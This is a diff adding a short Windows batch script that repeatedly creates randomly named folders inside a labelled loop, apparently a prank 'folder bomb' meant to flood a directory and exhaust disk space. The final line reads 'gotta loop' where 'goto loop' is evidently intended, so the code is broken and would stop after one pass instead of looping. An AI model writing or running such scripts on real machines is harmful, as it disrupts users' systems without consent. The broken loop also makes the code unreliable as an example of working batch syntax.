@@ -1,0 +1,21 @@
+@echo off
+:loop
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+gotta loop
